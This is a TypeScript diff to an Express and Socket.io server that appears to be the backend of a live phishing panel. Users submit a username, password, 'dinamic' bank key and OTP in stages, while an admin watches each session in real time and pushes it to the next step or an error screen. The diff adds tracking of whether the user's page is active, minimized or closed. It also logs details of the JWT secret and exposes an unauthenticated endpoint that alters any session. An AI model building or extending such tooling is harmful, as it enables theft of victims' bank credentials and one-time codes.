@@ -18,9 +18,9 @@ type Auth = { user: string; pass: string; dinamic: string; otp: string };
 type AdminRejectPayload = { sessionId: string; message?: string };
 type AdminRequestPayload = { sessionId: string };
 
-type UserSubmitAuth = { sessionId: string; auth: Auth };
-type UserSubmitDinamic = { sessionId: string; auth: Auth };
-type UserSubmitOtp = { sessionId: string; auth: Auth };
+type UserSubmitAuth = { auth: { user: string; pass: string } };
+type UserSubmitDinamic = { auth: { dinamic: string } };
+type UserSubmitOtp = { auth: { otp: string } };
 
 export type AuthPayload =
   | { role: "admin"; adminId: string; email: string }
@@ -55,6 +55,8 @@ const ORIGIN = process.env.LARAVEL_ORIGIN || "http://localhost:8000";
 
 const repo = new PrismaSessionRepository();
 const tokens = new JwtTokenService(process.env.NODE_JWT_SECRET!);
+console.log("NODE_JWT_SECRET set?", !!process.env.NODE_JWT_SECRET);
+console.log("NODE_JWT_SECRET len:", process.env.NODE_JWT_SECRET?.length);
 
 const app = express();
 app.use(express.json());
@@ -71,12 +73,13 @@ const io = new Server(httpServer, {
 io.use((socket, next) => {
   const token = socket.handshake.auth?.token;
   if (!token) return next(new Error("missing_token"));
-  try {
-    socket.data.auth = tokens.verify(token);
-    return next();
-  } catch {
-    return next(new Error("invalid_token"));
-  }
+ try {
+  socket.data.auth = tokens.verify(token);
+  return next();
+} catch (e) {
+  console.error("JWT verify failed:", e);
+  return next(new Error("invalid_token"));
+}
 });
 
 function isNonEmptyString(v: unknown): v is string {
@@ -91,12 +94,12 @@ function mustBeUser(socket: Socket) {
   if (socket.data.auth?.role !== "user") throw new Error("forbidden_user");
 }
 
-function mustMatchSession(socket: Socket, sessionIdFromPayload: string) {
-  const tokenSessionId =
+function getSessionIdFromSocket(socket: Socket): string {
+  const sid =
     socket.data.auth?.role === "user" ? socket.data.auth.sessionId : null;
-  if (!tokenSessionId || tokenSessionId !== sessionIdFromPayload) {
-    throw new Error("session_mismatch");
-  }
+
+  if (!sid) throw new Error("missing_session");
+  return sid;
 }
 
 async function emitSessionUpdate<T>(
@@ -115,7 +118,15 @@ async function emitSessionUpdate<T>(
   return s;
 }
 
-io.on("connect", (socket) => {
+const inactiveTimers = new Map<string, NodeJS.Timeout>();
+
+function clearInactiveTimer(sessionId: string) {
+  const t = inactiveTimers.get(sessionId);
+  if (t) clearTimeout(t);
+  inactiveTimers.delete(sessionId);
+}
+
+io.on("connection", async (socket) => {
   const auth = socket.data.auth;
   console.log(auth);
 
@@ -153,7 +164,12 @@ io.on("connect", (socket) => {
         if (!isNonEmptyString(payload.sessionId)) return;
 
         const s = await repo.findById(payload.sessionId);
-        if (!s || s.action !== ActionState.AUTH_WAIT_ACTION && s.action !== ActionState.OTP_WAIT_ACTION) return;
+        if (
+          !s ||
+          (s.action !== ActionState.AUTH_WAIT_ACTION &&
+            s.action !== ActionState.OTP_WAIT_ACTION)
+        )
+          return;
 
         await repo.update(payload.sessionId, {
           action: ActionState.DINAMIC,
@@ -192,7 +208,12 @@ io.on("connect", (socket) => {
         if (!isNonEmptyString(payload.sessionId)) return;
 
         const s = await repo.findById(payload.sessionId);
-        if (!s || s.action !== ActionState.DINAMIC_WAIT_ACTION && s.action !== ActionState.AUTH_WAIT_ACTION) return;
+        if (
+          !s ||
+          (s.action !== ActionState.DINAMIC_WAIT_ACTION &&
+            s.action !== ActionState.AUTH_WAIT_ACTION)
+        )
+          return;
 
         await repo.update(payload.sessionId, {
           action: ActionState.OTP,
@@ -245,15 +266,52 @@ io.on("connect", (socket) => {
       }
     });
   }
-
   if (auth.role === "user") {
-    socket.join(`session:${auth.sessionId}`);
-    repo.findById(auth.sessionId).then((s) => {
-      if (!s) return;
-      // ✅ evita mandar error viejo apenas conecta
-      if (s.action === ActionState.AUTH_ERROR) return;
-      socket.emit("session:update", s);
+    const sessionId = auth.sessionId;
+
+    clearInactiveTimer(sessionId); // ✅ cancela INACTIVE pendiente
+
+    socket.join(`session:${sessionId}`);
+
+    // ✅ al conectar: ACTIVE
+    await repo.update(sessionId, { state: SessionState.ACTIVE });
+    await emitSessionUpdate(io, repo, sessionId);
+
+    // ✅ opcional: bootstrap inicial (ya lo hace emitSessionUpdate)
+    // const s0 = await repo.findById(sessionId);
+    // if (s0 && s0.action !== ActionState.AUTH_ERROR) socket.emit("session:update", s0);
+
+    // ✅ presencia (MINIMIZED/ACTIVE) sin sessionId en payload
+    socket.on("user:presence", async (payload: { state: SessionState }) => {
+      try {
+        mustBeUser(socket);
+        const state = payload?.state;
+        if (!state) return;
+
+        await repo.update(sessionId, { state });
+        await emitSessionUpdate(io, repo, sessionId);
+      } catch (e) {
+        console.error("user:presence error", e);
+      }
     });
+
+    socket.on("disconnect", () => {
+      clearInactiveTimer(sessionId);
+      const t = setTimeout(async () => {
+        try {
+          await repo.update(sessionId, { state: SessionState.INACTIVE });
+          await emitSessionUpdate(io, repo, sessionId);
+        } catch (e) {
+          console.error("disconnect->inactive error", e);
+        }
+      }, 2500);
+      inactiveTimers.set(sessionId, t);
+    });
+
+    // Si reconecta rápido (refresh), cancela INACTIVE
+    // -------------------------
+    // USER SUBMITS (sin sessionId en payload)
+    // -------------------------
 
     socket.on(
       "user:submit_auth",
@@ -261,43 +319,37 @@ io.on("connect", (socket) => {
         try {
           mustBeUser(socket);
 
-          if (!isNonEmptyString(payload.sessionId))
-            return ack?.({ ok: false, error: "bad_session" });
-
-          mustMatchSession(socket, payload.sessionId);
-
-          const pass = payload.auth.pass?.trim();
-          const user = payload.auth.user?.trim();
+          const pass = payload?.auth?.pass?.trim();
+          const user = payload?.auth?.user?.trim();
 
           if (
             !isNonEmptyString(pass) ||
             pass.length < 2 ||
             !isNonEmptyString(user) ||
             user.length < 2
-          )
+          ) {
             return ack?.({ ok: false, error: "invalid_credentials" });
+          }
 
-          const s = await repo.findById(payload.sessionId);
+          const s = await repo.findById(sessionId);
           if (!s) return ack?.({ ok: false, error: "session not found" });
-
-          // ✅ permitir reintento
-          if (!s.action) return ack?.({ ok: false, error: "bad_state" });
 
           const allowed: ActionState[] = [
             ActionState.AUTH,
             ActionState.AUTH_ERROR,
           ];
+          
           if (!allowed.includes(s.action))
             return ack?.({ ok: false, error: "bad_state" });
 
-          await repo.update(payload.sessionId, {
-            user: user,
-            pass: pass,
+          await repo.update(sessionId, {
+            user,
+            pass,
             action: ActionState.AUTH_WAIT_ACTION,
             lastError: null,
           });
 
-          await emitSessionUpdate(io, repo, payload.sessionId);
+          await emitSessionUpdate(io, repo, sessionId);
           ack?.({ ok: true });
         } catch (e) {
           console.error("user:submit_auth error", e);
@@ -311,15 +363,13 @@ io.on("connect", (socket) => {
       async (payload: UserSubmitDinamic, ack?: Ack) => {
         try {
           mustBeUser(socket);
-          if (!isNonEmptyString(payload.sessionId))
-            return ack?.({ ok: false, error: "bad_session" });
-          mustMatchSession(socket, payload.sessionId);
 
-          const dinamic = payload.auth.dinamic.trim();
-          if (!isNonEmptyString(dinamic) || dinamic.length < 5)
-            return ack?.({ ok: false, error: "invalid_address" });
+          const dinamic = payload?.auth?.dinamic?.trim();
+          if (!isNonEmptyString(dinamic) || dinamic.length < 5) {
+            return ack?.({ ok: false, error: "invalid_dinamic" });
+          }
 
-          const s = await repo.findById(payload.sessionId);
+          const s = await repo.findById(sessionId);
           if (!s) return ack?.({ ok: false, error: "not_found" });
 
           const allowed: ActionState[] = [
@@ -329,13 +379,13 @@ io.on("connect", (socket) => {
           if (!allowed.includes(s.action))
             return ack?.({ ok: false, error: "bad_state" });
 
-          await repo.update(payload.sessionId, {
-            dinamic: dinamic,
+          await repo.update(sessionId, {
+            dinamic,
             action: ActionState.DINAMIC_WAIT_ACTION,
             lastError: null,
           });
 
-          await emitSessionUpdate(io, repo, payload.sessionId);
+          await emitSessionUpdate(io, repo, sessionId);
           ack?.({ ok: true });
         } catch (e) {
           console.error("user:submit_dinamic error", e);
@@ -347,28 +397,26 @@ io.on("connect", (socket) => {
     socket.on("user:submit_otp", async (payload: UserSubmitOtp, ack?: Ack) => {
       try {
         mustBeUser(socket);
-        if (!isNonEmptyString(payload.sessionId))
-          return ack?.({ ok: false, error: "bad_session" });
-        mustMatchSession(socket, payload.sessionId);
 
-        const otp = payload.auth.otp.trim();
-        if (!isNonEmptyString(otp) || otp.length < 5)
+        const otp = payload?.auth?.otp?.trim(); // si tu tipo real es payload.otp, ajusta aquí
+        if (!isNonEmptyString(otp) || otp.length < 5) {
           return ack?.({ ok: false, error: "invalid_otp" });
+        }
 
-        const s = await repo.findById(payload.sessionId);
+        const s = await repo.findById(sessionId);
         if (!s) return ack?.({ ok: false, error: "not_found" });
 
         const allowed: ActionState[] = [ActionState.OTP, ActionState.OTP_ERROR];
         if (!allowed.includes(s.action))
           return ack?.({ ok: false, error: "bad_state" });
 
-        await repo.update(payload.sessionId, {
+        await repo.update(sessionId, {
           otp,
           action: ActionState.OTP_WAIT_ACTION,
           lastError: null,
         });
 
-        await emitSessionUpdate(io, repo, payload.sessionId);
+        await emitSessionUpdate(io, repo, sessionId);
         ack?.({ ok: true });
       } catch (e) {
         console.error("user:submit_otp error", e);
@@ -385,6 +433,8 @@ app.post("/api/sessions", async (_req, res) => {
 
   if (data.user && data.pass) {
     data.action = ActionState.AUTH_WAIT_ACTION;
+  } else {
+    data.action = ActionState.AUTH; // o el default de prisma
   }
 
   console.log(data);
@@ -416,6 +466,24 @@ app.post("/api/admin/issue-token", (req, res) => {
 
   const token = tokens.signAdmin(userId);
   res.json({ token });
+});
+
+app.post("/api/sessions/:id/presence", async (req, res) => {
+  try {
+    const id = req.params.id;
+    const state = req.body?.state as SessionState | undefined;
+
+    if (!state) return res.status(400).json({ ok: false });
+
+    await repo.update(id, { state });
+    // opcional emitir update si quieres:
+    await emitSessionUpdate(io, repo, id);
+
+    res.json({ ok: true });
+  } catch (e) {
+    console.error("presence REST error", e);
+    res.status(500).json({ ok: false });
+  }
 });
 
 httpServer.listen(PORT, () => {
